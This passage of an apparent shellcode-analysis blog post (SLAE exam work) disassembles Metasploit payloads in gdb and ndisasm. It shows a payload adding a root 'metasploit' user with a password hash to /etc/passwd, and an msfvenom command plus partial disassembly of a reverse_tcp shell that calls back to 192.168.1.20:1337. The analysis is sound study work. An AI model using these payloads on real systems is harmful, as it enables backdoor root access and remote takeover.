</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#000>(</span><span style=color:#000>gdb</span>) <span style=color:#000>r</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#000>Starting</span> <span style=color:#000>program</span>: <span style=color:#000>/</span><span style=color:#000>home</span><span style=color:#000>/</span><span style=color:#000>dubs3c</span><span style=color:#000>/</span><span style=color:#000>SLAE</span><span style=color:#000>/</span><span style=color:#000>EXAM</span><span style=color:#000>/</span><span style=color:#000>github</span><span style=color:#000>/</span><span style=color:#000>assignment_5</span><span style=color:#000>/</span><span style=color:#000>add_user</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#000>Breakpoint</span> <span style=color:#1c01ce>1</span>, <span style=color:#1c01ce>0x08048054</span> <span style=color:#000>in</span> <span style=color:#000>??</span> ()
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#000>(</span><span style=color:#000>gdb</span>) <span style=color:#000>disas</span> <span style=color:#1c01ce>0x8048054</span>, <span style=color:#1c01ce>0x8048054</span><span style=color:#000>+</span><span style=color:#1c01ce>97</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#000>Dump</span> <span style=color:#000>of</span> <span style=color:#000>assembler</span> <span style=color:#000>code</span> <span style=color:#000>from</span> <span style=color:#1c01ce>0x8048054</span> <span style=color:#000>to</span> <span style=color:#1c01ce>0x80480b5</span>:
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#000>=&gt;</span> <span style=color:#000>0</span><span style=color:#000>x08048054:</span>  <span style=color:#000>xor</span>    <span style=color:#000>ecx</span>,<span style=color:#000>ecx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span>   <span style=color:#000>0</span><span style=color:#000>x08048056:</span>  <span style=color:#000>mov</span>    <span style=color:#000>ebx</span>,<span style=color:#000>ecx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span>   <span style=color:#000>0</span><span style=color:#000>x08048058:</span>  <span style=color:#000>push</span>   <span style=color:#1c01ce>0x46</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span>   <span style=color:#000>0</span><span style=color:#000>x0804805a:</span>  <span style=color:#000>pop</span>    <span style=color:#000>eax</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span>   <span style=color:#000>0</span><span style=color:#000>x0804805b:</span>  <span style=color:#000>int</span>    <span style=color:#1c01ce>0x80</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span>   <span style=color:#000>0</span><span style=color:#000>x0804805d:</span>  <span style=color:#000>push</span>   <span style=color:#1c01ce>0x5</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span>   <span style=color:#000>0</span><span style=color:#000>x0804805f:</span>  <span style=color:#000>pop</span>    <span style=color:#000>eax</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span>   <span style=color:#000>0</span><span style=color:#000>x08048060:</span>  <span style=color:#000>xor</span>    <span style=color:#000>ecx</span>,<span style=color:#000>ecx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span>   <span style=color:#000>0</span><span style=color:#000>x08048062:</span>  <span style=color:#000>push</span>   <span style=color:#000>ecx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span>   <span style=color:#000>0</span><span style=color:#000>x08048063:</span>  <span style=color:#000>push</span>   <span style=color:#1c01ce>0x64777373</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>   <span style=color:#000>0</span><span style=color:#000>x08048068:</span>  <span style=color:#000>push</span>   <span style=color:#1c01ce>0x61702f2f</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>   <span style=color:#000>0</span><span style=color:#000>x0804806d:</span>  <span style=color:#000>push</span>   <span style=color:#1c01ce>0x6374652f</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>   <span style=color:#000>0</span><span style=color:#000>x08048072:</span>  <span style=color:#000>mov</span>    <span style=color:#000>ebx</span>,<span style=color:#000>esp</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>   <span style=color:#000>0</span><span style=color:#000>x08048074:</span>  <span style=color:#000>inc</span>    <span style=color:#000>ecx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span>   <span style=color:#000>0</span><span style=color:#000>x08048075:</span>  <span style=color:#000>mov</span>    <span style=color:#000>ch</span>,<span style=color:#1c01ce>0x4</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>   <span style=color:#000>0</span><span style=color:#000>x08048077:</span>  <span style=color:#000>int</span>    <span style=color:#1c01ce>0x80</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span>   <span style=color:#000>0</span><span style=color:#000>x08048079:</span>  <span style=color:#000>xchg</span>   <span style=color:#000>ebx</span>,<span style=color:#000>eax</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span>   <span style=color:#000>0</span><span style=color:#000>x0804807a:</span>  <span style=color:#000>call</span>   <span style=color:#1c01ce>0x80480a7</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span>   <span style=color:#000>0</span><span style=color:#000>x0804807f:</span>  <span style=color:#000>ins</span>    <span style=color:#000>DWORD</span> <span style=color:#000>PTR</span> <span style=color:#000>es</span>:[<span style=color:#000>edi</span>],<span style=color:#000>dx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span>   <span style=color:#000>0</span><span style=color:#000>x08048080:</span>  <span style=color:#000>gs</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>   <span style=color:#000>0</span><span style=color:#000>x08048081:</span>  <span style=color:#000>je</span>     <span style=color:#1c01ce>0x80480e4</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>   <span style=color:#000>0</span><span style=color:#000>x08048083:</span>  <span style=color:#000>jae</span>    <span style=color:#1c01ce>0x80480f5</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>   <span style=color:#000>0</span><span style=color:#000>x08048085:</span>  <span style=color:#000>ins</span>    <span style=color:#000>BYTE</span> <span style=color:#000>PTR</span> <span style=color:#000>es</span>:[<span style=color:#000>edi</span>],<span style=color:#000>dx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span>   <span style=color:#000>0</span><span style=color:#000>x08048086:</span>  <span style=color:#000>outs</span>   <span style=color:#000>dx</span>,<span style=color:#000>DWORD</span> <span style=color:#000>PTR</span> <span style=color:#000>ds</span>:[<span style=color:#000>esi</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>   <span style=color:#000>0</span><span style=color:#000>x08048087:</span>  <span style=color:#000>imul</span>   <span style=color:#000>esi</span>,<span style=color:#000>DWORD</span> <span style=color:#000>PTR</span> [<span style=color:#000>edx</span><span style=color:#000>+</span><span style=color:#000>edi</span>*<span style=color:#1c01ce>1</span><span style=color:#000>+</span><span style=color:#1c01ce>0x41</span>],<span style=color:#1c01ce>0x49642f7a</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span>   <span style=color:#000>0</span><span style=color:#000>x0804808f:</span>  <span style=color:#000>jae</span>    <span style=color:#1c01ce>0x80480fb</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span>   <span style=color:#000>0</span><span style=color:#000>x08048091:</span>  <span style=color:#000>xor</span>    <span style=color:#000>al</span>,<span style=color:#1c01ce>0x70</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span>   <span style=color:#000>0</span><span style=color:#000>x08048093:</span>  <span style=color:#000>xor</span>    <span style=color:#000>al</span>,<span style=color:#1c01ce>0x49</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span>   <span style=color:#000>0</span><span style=color:#000>x08048095:</span>  <span style=color:#000>push</span>   <span style=color:#000>edx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span>   <span style=color:#000>0</span><span style=color:#000>x08048096:</span>  <span style=color:#000>arpl</span>   <span style=color:#000>WORD</span> <span style=color:#000>PTR</span> [<span style=color:#000>edx</span>],<span style=color:#000>di</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span><span>   <span style=color:#000>0</span><span style=color:#000>x08048098:</span>  <span style=color:#000>xor</span>    <span style=color:#000>BYTE</span> <span style=color:#000>PTR</span> [<span style=color:#000>edx</span>],<span style=color:#000>bh</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span><span>   <span style=color:#000>0</span><span style=color:#000>x0804809a:</span>  <span style=color:#000>xor</span>    <span style=color:#000>BYTE</span> <span style=color:#000>PTR</span> [<span style=color:#000>edx</span>],<span style=color:#000>bh</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span><span>   <span style=color:#000>0</span><span style=color:#000>x0804809c:</span>  <span style=color:#000>cmp</span>    <span style=color:#000>ch</span>,<span style=color:#000>BYTE</span> <span style=color:#000>PTR</span> [<span style=color:#000>edi</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44</span><span>   <span style=color:#000>0</span><span style=color:#000>x0804809e:</span>  <span style=color:#000>cmp</span>    <span style=color:#000>ch</span>,<span style=color:#000>BYTE</span> <span style=color:#000>PTR</span> [<span style=color:#000>edi</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45</span><span>   <span style=color:#000>0</span><span style=color:#000>x080480a0:</span>  <span style=color:#000>bound</span>  <span style=color:#000>ebp</span>,<span style=color:#000>QWORD</span> <span style=color:#000>PTR</span> [<span style=color:#000>ecx</span><span style=color:#000>+</span><span style=color:#1c01ce>0x6e</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46</span><span>   <span style=color:#000>0</span><span style=color:#000>x080480a3:</span>  <span style=color:#000>das</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47</span><span>   <span style=color:#000>0</span><span style=color:#000>x080480a4:</span>  <span style=color:#000>jae</span>    <span style=color:#1c01ce>0x804810e</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48</span><span>   <span style=color:#000>0</span><span style=color:#000>x080480a6:</span>  <span style=color:#000>or</span>     <span style=color:#000>bl</span>,<span style=color:#000>BYTE</span> <span style=color:#000>PTR</span> [<span style=color:#000>ecx-0x75</span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49</span><span>   <span style=color:#000>0</span><span style=color:#000>x080480a9:</span>  <span style=color:#000>push</span>   <span style=color:#000>ecx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50</span><span>   <span style=color:#000>0</span><span style=color:#000>x080480aa:</span>  <span style=color:#000>cld</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51</span><span>   <span style=color:#000>0</span><span style=color:#000>x080480ab:</span>  <span style=color:#000>push</span>   <span style=color:#1c01ce>0x4</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52</span><span>   <span style=color:#000>0</span><span style=color:#000>x080480ad:</span>  <span style=color:#000>pop</span>    <span style=color:#000>eax</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53</span><span>   <span style=color:#000>0</span><span style=color:#000>x080480ae:</span>  <span style=color:#000>int</span>    <span style=color:#1c01ce>0x80</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54</span><span>   <span style=color:#000>0</span><span style=color:#000>x080480b0:</span>  <span style=color:#000>push</span>   <span style=color:#1c01ce>0x1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55</span><span>   <span style=color:#000>0</span><span style=color:#000>x080480b2:</span>  <span style=color:#000>pop</span>    <span style=color:#000>eax</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56</span><span>   <span style=color:#000>0</span><span style=color:#000>x080480b3:</span>  <span style=color:#000>int</span>    <span style=color:#1c01ce>0x80</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57</span><span><span style=color:#000>End</span> <span style=color:#000>of</span> <span style=color:#000>assembler</span> <span style=color:#000>dump.</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58</span><span><span style=color:#000>(</span><span style=color:#000>gdb</span>)
</span></span></code></pre></div><p>We are interested in the following instruction <code>0x0804807a: call 0x80480a7</code>. Let&rsquo;s set a breakpoint and step to the next instruction to see where we land!</p><pre tabindex=0><code>(gdb) b *0x0804807a
Breakpoint 2 at 0x804807a
(gdb) c
Continuing.

Breakpoint 2, 0x0804807a in ?? ()
(gdb) ni
0x080480a7 in ?? ()
(gdb) x/8i $pc                                                                                                                        =&gt; 0x80480a7:   pop    ecx
   0x80480a8:   mov    edx,DWORD PTR [ecx-0x4]
   0x80480ab:   push   0x4
   0x80480ad:   pop    eax      ; write() syscall
   0x80480ae:   int    0x80     ; execute syscall
   0x80480b0:   push   0x1
   0x80480b2:   pop    eax      ; exit() syscall
   0x80480b3:   int    0x80     ; execute syscall, exit program
(gdb) ni
0x080480a8 in ?? ()
(gdb) x/s  $ecx
0x804807f:      &#34;metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q\374j\004Xj\001X&#34;
(gdb) x/x $ecx-4
0x804807b:      0x28
(gdb)
</code></pre><p>As can be seen in the above GDB output, the gibberish data was actually a string containing the new username and password. This string will be written to <code>/etc/passwd</code>. The string was popped into <code>ecx</code> because of the call instruction that pushed the address of the following instruction onto the stack. <code>edx</code> contains the amount of bytes to write, the instruction that computes this is at address <code>0x80480a8</code>. Completing the program inserts a new user called metasploit (password is metasploit) to the system:</p><pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_5$ grep metasploit /etc/passwd
metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh
</code></pre><p>Should be noted that the binary needs to be run as root, since it&rsquo;s adding a root user.</p><h2 id=linuxx86shellreverse_tcp>linux/x86/shell/reverse_tcp</h2><p>For the final paylaod, we&rsquo;ll analyze <code>linux/x86/shell/reverse_tcp</code> which can be generated with:</p><pre tabindex=0><code>$ msfvenom -p linux/x86/shell/reverse_tcp -a x86 --platform linux lhost=192.168.1.20 lport=1337 -f elf -o build/reverse_tcp
</code></pre><p>A reverse shell will send a local shell to a remote server, often controlled by an attacker. Let&rsquo;s begin analyzing with <code>ndisasm</code> again.</p><div class=highlight><pre tabindex=0 style=background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-asm data-lang=asm><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#000>dubs3c@slae:</span><span style=color:#000>~/</span><span style=color:#000>SLAE</span><span style=color:#000>/</span><span style=color:#000>EXAM</span><span style=color:#000>/</span><span style=color:#000>github</span><span style=color:#000>/</span><span style=color:#000>assignment_5$</span> <span style=color:#000>msfvenom</span> -<span style=color:#000>p</span> <span style=color:#000>linux</span><span style=color:#000>/</span><span style=color:#000>x86</span><span style=color:#000>/</span><span style=color:#000>shell</span><span style=color:#000>/</span><span style=color:#000>reverse_tcp</span> -<span style=color:#000>a</span> <span style=color:#000>x86</span> --<span style=color:#000>platform</span> <span style=color:#000>linux</span> <span style=color:#000>lhost</span><span style=color:#000>=</span><span style=color:#1c01ce>192</span><span style=color:#000>.168.1.20</span> <span style=color:#000>lport</span><span style=color:#000>=</span><span style=color:#1c01ce>1337</span> -<span style=color:#000>f</span> <span style=color:#000>raw</span> <span style=color:#000>|</span> <span style=color:#000>ndisasm</span> -<span style=color:#000>u</span> -
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#000>No</span> <span style=color:#000>encoder</span> <span style=color:#000>specified</span>, <span style=color:#000>outputting</span> <span style=color:#000>raw</span> <span style=color:#000>payload</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#000>Payload</span> <span style=color:#000>size</span>: <span style=color:#1c01ce>123</span> <span style=color:#000>bytes</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#000>00000000</span>  <span style=color:#000>6</span><span style=color:#000>A0A</span>              <span style=color:#000>push</span> <span style=color:#000>byte</span> <span style=color:#000>+</span><span style=color:#1c01ce>0xa</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#000>00000002</span>  <span style=color:#000>5</span><span style=color:#000>E</span>                <span style=color:#000>pop</span> <span style=color:#000>esi</span>                 <span style=color:#177500>; 10 connection attempts
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#177500></span><span style=color:#000>00000003</span>  <span style=color:#000>31</span><span style=color:#000>DB</span>              <span style=color:#000>xor</span> <span style=color:#000>ebx</span>,<span style=color:#000>ebx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#000>00000005</span>  <span style=color:#000>F7E3</span>              <span style=color:#000>mul</span> <span style=color:#000>ebx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#000>00000007</span>  <span style=color:#000>53</span>                <span style=color:#000>push</span> <span style=color:#000>ebx</span>                <span style=color:#177500>; socket protocol: 0
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#177500></span><span style=color:#000>00000008</span>  <span style=color:#000>43</span>                <span style=color:#000>inc</span> <span style=color:#000>ebx</span>                 <span style=color:#177500>; SYS_SOCKET
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#177500></span><span style=color:#000>00000009</span>  <span style=color:#000>53</span>                <span style=color:#000>push</span> <span style=color:#000>ebx</span>                <span style=color:#177500>; socket type: SOCK_STREAM = 1
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#177500></span><span style=color:#000>0000000</span><span style=color:#000>A</span>  <span style=color:#1c01ce>6</span><span style=color:#000>A02</span>              <span style=color:#000>push</span> <span style=color:#000>byte</span> <span style=color:#000>+</span><span style=color:#1c01ce>0x2</span>          <span style=color:#177500>; socket domain: PF_INET = 2
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#177500></span><span style=color:#000>0000000</span><span style=color:#000>C</span>  <span style=color:#000>B066</span>              <span style=color:#000>mov</span> <span style=color:#000>al</span>,<span style=color:#1c01ce>0x66</span>             <span style=color:#177500>; socketcall()
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#177500></span><span style=color:#000>0000000</span><span style=color:#000>E</span>  <span style=color:#1c01ce>89</span><span style=color:#000>E1</span>              <span style=color:#000>mov</span> <span style=color:#000>ecx</span>,<span style=color:#000>esp</span>             <span style=color:#177500>; socket() arguments used in second parameter for socketcall
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#177500></span><span style=color:#000>00000010</span>  <span style=color:#000>CD80</span>              <span style=color:#000>int</span> <span style=color:#1c01ce>0x80</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#000>00000012</span>  <span style=color:#000>97</span>                <span style=color:#000>xchg</span> <span style=color:#000>eax</span>,<span style=color:#000>edi</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#000>00000013</span>  <span style=color:#000>5</span><span style=color:#000>B</span>                <span style=color:#000>pop</span> <span style=color:#000>ebx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#000>00000014</span>  <span style=color:#000>68</span><span style=color:#000>C0A80114</span>        <span style=color:#000>push</span> <span style=color:#000>dword</span> <span style=color:#1c01ce>0x1401a8c0</span>   <span style=color:#177500>; 192.168.1.20
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#177500></span><span style=color:#000>00000019</span>  <span style=color:#000>6802000539</span>        <span style=color:#000>push</span> <span style=color:#000>dword</span> <span style=color:#1c01ce>0x39050002</span>   <span style=color:#177500>; 1337
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#177500></span><span style=color:#000>0000001</span><span style=color:#000>E</span>  <span style=color:#1c01ce>89</span><span style=color:#000>E1</span>              <span style=color:#000>mov</span> <span style=color:#000>ecx</span>,<span style=color:#000>esp</span>             <span style=color:#177500>; sockaddr struct
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#177500></span><span style=color:#000>00000020</span>  <span style=color:#000>6</span><span style=color:#000>A66</span>              <span style=color:#000>push</span> <span style=color:#000>byte</span> <span style=color:#000>+</span><span style=color:#1c01ce>0x66</span>         <span style=color:#177500>; socketcall()
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#177500></span><span style=color:#000>00000022</span>  <span style=color:#000>58</span>                <span style=color:#000>pop</span> <span style=color:#000>eax</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#000>00000023</span>  <span style=color:#000>50</span>                <span style=color:#000>push</span> <span style=color:#000>eax</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#000>00000024</span>  <span style=color:#000>51</span>                <span style=color:#000>push</span> <span style=color:#000>ecx</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span><span style=color:#000>00000025</span>  <span style=color:#000>57</span>                <span style=color:#000>push</span> <span style=color:#000>edi</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span><span style=color:#000>00000026</span>  <span style=color:#000>89</span><span style=color:#000>E1</span>              <span style=color:#000>mov</span> <span style=color:#000>ecx</span>,<span style=color:#000>esp</span>             <span style=color:#177500>; connect() arguments used in second parameter for socketcall
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span><span style=color:#177500></span><span style=color:#000>00000028</span>  <span style=color:#000>43</span>                <span style=color:#000>inc</span> <span style=color:#000>ebx</span>                 <span style=color:#177500>; SYS_CONNECT
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span><span style=color:#177500></span><span style=color:#000>00000029</span>  <span style=color:#000>CD80</span>              <span style=color:#000>int</span> <span style=color:#1c01ce>0x80</span>                <span style=color:#177500>; Execute syscall
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span><span style=color:#177500></span><span style=color:#000>0000002</span><span style=color:#000>B</span>  <span style=color:#1c01ce>85</span><span style=color:#000>C0</span>              <span style=color:#000>test</span> <span style=color:#000>eax</span>,<span style=color:#000>eax</span>            <span style=color:#177500>; Test if connect() returned success
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span><span style=color:#177500></span><span style=color:#000>0000002</span><span style=color:#000>D</span>  <span style=color:#1c01ce>7919</span>              <span style=color:#000>jns</span> <span style=color:#1c01ce>0x48</span>                <span style=color:#177500>; If not zero, jump to 00000048
